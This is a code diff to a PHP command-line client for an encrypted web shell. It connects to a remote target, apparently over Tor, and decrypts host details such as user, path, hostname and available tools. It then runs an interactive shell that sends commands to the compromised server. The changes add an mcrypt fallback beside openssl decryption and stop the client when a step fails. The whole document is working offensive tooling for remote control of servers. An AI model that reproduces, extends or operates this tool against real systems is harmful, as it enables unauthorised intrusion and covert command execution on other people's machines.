@@ -52,6 +52,7 @@ $time        = '';
 $ip          = '';
 $client_ip   = '';
 $tools       = array();
+$method      = 'openssl';
 
 echo " [+] Trying to connect... ";
 
@@ -64,13 +65,29 @@ if ($result['status'] != 200) {
 
 echo "Good.\n";
 echo " [+] Let's parse the host information... ";
-
 if(strpos($result['content'],'captcha') > -1) {
     echo "Failed, some Captcha was found, try to reset the Tor circuit...\n";
+    exit(-1);
 } elseif (strpos($result['content'],'openssl_encrypt') > -1){
-    echo "Failed, the Target doesn't Encryption.\n";
-} else {
-    $response    = json_decode(decrypt($result['content'], $key), true);
+    echo "Failed, the Target doesn't support Encryption.\n";
+    exit(-1);
+} elseif (strpos($result['content'],'mcrypt') > -1){
+    echo "Failed, the Target doesn't support Encryption.\n";
+    exit(-1);
+}else {
+    $response = decrypt($result['content'], $key,  $method);
+
+    if(is_null($response) || $response == false){
+        $method = 'mcrypt';
+        $response = decrypt($result['content'], $key,  $method);
+        if(is_null($response) || $response == false) {
+            echo "Failed, unable to decrypt the response.\n\n";
+            exit(-1);
+        }
+    }
+
+    $response = json_decode($response, true);
+
     $username    = $response['user'];
     $path        = $response['path'];
     $hostname    = $response['hostname'];
@@ -82,7 +99,7 @@ if(strpos($result['content'],'captcha') > -1) {
     $client_ip   = $response['client_ip'];
     $tools       = explode('|', $response['tools']);
     echo "Done.\n";
-    unset($response);
+    unset($response, $result);
 }
 
 echo " [+] Opening the shell... \n";
@@ -103,13 +120,13 @@ do {
     $line   = readline($prefix);
     $cmd    = trim(str_replace(array("\n", "\r"), '', $line));
     if ($cmd != 'exit' && strlen($cmd) > 0) {
-        $data = make_request($cmd, $path, $key);
+        $data = make_request($cmd, $path, $key, $method);
         if (!isset($data['c']) && !isset($data['f'])) {
             continue;
         }
         $result = send_request($url, $data, $login, $password, $proxy, $cookies);
         if ($result['status'] == 200) {
-            $decrypted_content = decrypt($result['content'], $key);
+            $decrypted_content = decrypt($result['content'], $key, $method);
             $response          = json_decode($decrypted_content, true);
             $path              = base64_decode($response['path']);
             $files             = $response['files'];
